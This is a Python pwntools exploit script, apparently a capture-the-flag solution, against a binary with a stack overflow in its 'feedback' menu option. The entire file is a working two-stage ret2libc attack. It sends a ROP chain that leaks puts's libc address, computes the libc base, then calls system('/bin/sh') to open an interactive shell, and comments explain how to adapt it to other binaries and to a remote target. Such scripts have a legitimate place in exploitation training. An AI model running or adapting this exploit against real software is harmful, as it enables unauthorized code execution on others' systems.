#!/usr/bin/env python3
from pwn import *

# --- Configuration ---
# Set the context for the binary
context.binary = elf = ELF('./pwn')
# Use this line for a local binary
p = process()
# Use this line to connect to a remote server
# p = remote('hostname', 1337)

# This assumes you have the correct libc file in the same directory.
# You can find which libc the binary uses with `ldd ./your_binary_name`
libc = ELF('./libc.so.6')

# --- Addresses and Offset ---
# These values MUST be found from your specific binary.
# The offset from the start of your input to the return address.
OFFSET = 72 # Likely 72, but VERIFY THIS.
# Addresses from `objdump -d ./your_binary_name` or gdb
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN_ADDR = elf.symbols['main']

# Find with `ROPgadget --binary ./your_binary_name | grep "pop rdi"`
POP_RDI_RET = 0x00000000004016c3 # Example address, replace with yours

# --- Stage 1: Leak Libc Address ---
log.info("Starting Stage 1: Leaking puts@libc address")

# Craft the first payload
# 1. Fill the buffer up to the return address
# 2. POP_RDI_RET: Pop the next address (puts@got) into the RDI register
# 3. PUTS_GOT: The argument for puts()
# 4. PUTS_PLT: The address to call (puts itself)
# 5. MAIN_ADDR: The address to return to after puts finishes, so we can exploit again
payload1 = flat(
    b'A' * OFFSET,
    POP_RDI_RET,
    PUTS_GOT,
    PUTS_PLT,
    MAIN_ADDR
)

# Send the payload
p.sendlineafter(b'Enter your choice: ', b'3')
p.sendlineafter(b'Enter feedback: ', payload1)

# The program returns to main, so we receive the menu output first.
# The leaked address will be right before that.
p.recvuntil(b'successfully!\n\n') # Clean up buffer

# Read the leaked address. It's 8 bytes on x64.
# .strip() removes the newline, and .ljust() pads it to 8 bytes for unpacking.
leaked_puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@libc address: {hex(leaked_puts_addr)}")

# --- Stage 2: Calculate addresses and get a shell ---
log.info("Starting Stage 2: Calculating addresses and popping a shell")

# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.success(f"Calculated libc base address: {hex(libc.address)}")

# Calculate the real addresses of system() and "/bin/sh"
SYSTEM_ADDR = libc.symbols['system']
BINSH_ADDR = next(libc.search(b'/bin/sh\x00'))
log.info(f"system() address: {hex(SYSTEM_ADDR)}")
log.info(f"'/bin/sh' string address: {hex(BINSH_ADDR)}")

# Craft the second payload
# 1. Fill the buffer
# 2. POP_RDI_RET: To pop the address of "/bin/sh" into RDI
# 3. BINSH_ADDR: The argument for system()
# 4. SYSTEM_ADDR: The address to call, which is system()
payload2 = flat(
    b'A' * OFFSET,
    POP_RDI_RET,
    BINSH_ADDR,
    SYSTEM_ADDR
)

# Send the final payload
p.sendlineafter(b'Enter your choice: ', b'3')
p.sendlineafter(b'Enter feedback: ', payload2)

# Enjoy your shell!
log.success("Payload sent! Dropping to interactive shell...")
p.interactive()
